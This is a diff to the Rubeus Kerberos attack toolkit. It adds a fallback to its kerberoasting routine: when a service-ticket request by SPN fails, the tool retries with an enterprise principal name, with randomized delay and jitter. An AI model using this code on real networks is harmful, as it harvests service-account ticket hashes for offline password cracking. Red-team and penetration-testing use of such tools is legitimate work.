@@ -529,6 +529,13 @@ namespace Rubeus
                                 // otherwise use the KerberosRequestorSecurityToken method
                                 bool result = GetTGSRepHash(servicePrincipalName, samAccountName, distinguishedName, cred, outFile, simpleOutput);
                                 Helpers.RandomDelayWithJitter(delay, jitter);
+                                if (!result && autoenterprise)
+                                {
+                                    Console.WriteLine("\r\n[-] Retrieving service ticket with SPN failed and '/autoenterprise' passed, retrying with the enterprise principal");
+                                    servicePrincipalName = String.Format("{0}@{1}", samAccountName, domain);
+                                    GetTGSRepHash(servicePrincipalName, samAccountName, distinguishedName, cred, outFile, simpleOutput);
+                                    Helpers.RandomDelayWithJitter(delay, jitter);
+                                }
                             }
                         }
                     }
